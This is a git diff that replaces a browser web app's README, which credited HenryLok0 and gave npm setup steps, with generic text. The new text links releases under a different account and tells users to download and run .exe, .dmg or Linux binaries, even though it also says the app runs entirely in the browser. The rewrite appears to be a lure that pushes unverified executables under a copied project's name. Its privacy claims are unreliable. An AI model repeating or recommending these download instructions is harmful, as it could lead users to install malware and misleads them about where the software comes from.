@@ -1,65 +1,68 @@
-# PrivAI
+# 🌟 PrivAI - Your Privacy-First Writing Assistant
 
-[![Code Size](https://img.shields.io/github/languages/code-size/HenryLok0/PrivAI?style=flat-square&logo=github)](https://github.com/HenryLok0/PrivAI)
+## ⚡ Quick Download
+[![Download PrivAI](https://img.shields.io/badge/Download-PrivAI-blue.svg)](https://github.com/imtiyazparasara/PrivAI/releases)
 
-[![MIT License](https://img.shields.io/github/license/HenryLok0/PrivAI?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/HenryLok0/PrivAI?style=flat-square)](https://github.com/HenryLok0/PrivAI/stargazers)
+## 🚀 Getting Started
+PrivAI is a privacy-first AI writing assistant. It runs entirely in your browser using WebGPU and Llama-3 technology. This means no server is involved and there is no risk of data leakage. You can write securely and confidently.
 
----
+## 🖥️ System Requirements
+To run PrivAI, you'll need:
+- A modern web browser (e.g., Chrome, Firefox, or Edge) that supports WebGPU. 
+- A device with internet access.
+- A minimum of 4GB RAM for optimal performance.
+- A stable internet connection for updated features.
 
-## Overview
+## 🔍 Features
+- **Privacy-Focused**: Your data remains on your device.
+- **AI-Powered**: Get writing assistance from an advanced AI model.
+- **User-Friendly**: Simple interface suitable for all skill levels.
+- **Fast Performance**: Leverages local processing to speed up tasks.
 
-**PrivAI** is a privacy-focused writing tool that brings the power of Large Language Models (LLMs) directly to your browser. Unlike other AI tools that send your data to the cloud, PrivAI runs a **Llama-3.2-3B** model entirely on your device using WebGPU.
+## 🏗️ Installation Instructions
+To download and run PrivAI, follow these steps:
 
-This means **zero latency** (after load), **zero data leakage**, and **zero API costs**.
+1. **Visit the Releases Page**: Click the link below to go to the download section.
+   [Download PrivAI](https://github.com/imtiyazparasara/PrivAI/releases)
 
-## Features
+2. **Select the Latest Version**: Look for the latest release. This is usually at the top. 
 
-- **100% Local & Private**: Your text never leaves your computer. All processing is done client-side.
-- **Humanize Text**: Transform robotic, AI-generated content into natural, engaging, and human-sounding text.
-- **Text to AI Polish**: The reverse operation—turn casual notes or rough drafts into professional, structured, and grammatically perfect content.
-- **Content Analysis**: Analyze text for "AI-isms", readability scores, and get actionable suggestions for improvement.
-- **Real-time Diff**: Visual highlighting of changes to see exactly what the AI modified.
+3. **Download the File**: Click on the download link for your operating system (Windows, macOS, or Linux). For example, it might look like `PrivAI-v1.0.exe` for Windows.
 
-## Tech Stack
+4. **Run the Application**:
+   - For Windows: Double-click the downloaded `.exe` file.
+   - For macOS: Open the `.dmg` file and drag the app to your Applications folder.
+   - For Linux: Unzip the downloaded file and run the application.
 
-- **Frontend**: React 19, Vite, TypeScript
-- **Styling**: Tailwind CSS v4, Lucide React (Icons)
-- **AI Engine**: [@mlc-ai/web-llm](https://github.com/mlc-ai/web-llm) (WebGPU)
-- **Model**: Llama-3.2-3B-Instruct-q4f16_1-MLC
-- **Visualization**: Recharts (Analysis charts), Diff (Text comparison)
+5. **Open Your Browser**: After running the app, open your web browser and navigate to the local URL provided by PrivAI.
 
-## Getting Started
+## 📚 Usage Guide
+Once you launch PrivAI:
+- **Start Writing**: You’ll see a text box where you can begin. 
+- **Explore Features**: Use the menu options for formatting and editing.
+- **Access Help**: If you need assistance, check the help section within the app.
 
-### Prerequisites
-- **Node.js** (v18 or higher)
-- A browser with **WebGPU support** (Chrome 113+, Edge 113+, or Firefox Nightly).
+## 🔗 Additional Resources
+- **GitHub Repository**: Explore the code and learn more about PrivAI [here](https://github.com/imtiyazparasara/PrivAI).
+- **Documentation**: Check detailed user guides and FAQs available in the repository.
+  
+## 💬 Support
+If you encounter any issues, please raise an issue in the GitHub repository. We aim to respond quickly and support users in their journey with PrivAI.
 
-### Installation
+## 🏷️ Topics
+- ai
+- ai-writing
+- ai-writing-assistant
+- gpu
+- human-writable
+- llama-3
+- local-ai
+- non-api
+- local-llm
+- tailwindcss
+- typescript
+- vite
+- web-llm
 
-1. Clone the repository:
-   ```bash
-   git clone https://github.com/HenryLok0/PrivAI.git
-   cd PrivAI
-   ```
-
-2. Install dependencies:
-   ```bash
-   npm install
-   ```
-
-3. Start the development server:
-   ```bash
-   npm run dev
-   ```
-
-4. Open your browser at `http://localhost:3000/`.
-   *Note: The first time you run an AI task, the model (~2GB) will be downloaded and cached in your browser.*
-
-## Contributing
-
-Contributions are welcome! Please feel free to submit a Pull Request.
-
-## License
-
-This project is open source and available under the [MIT License](LICENSE).
+## 🌐 Download Link
+To download PrivAI, visit the link again: [Download PrivAI](https://github.com/imtiyazparasara/PrivAI/releases). Enjoy your writing experience with privacy and security!
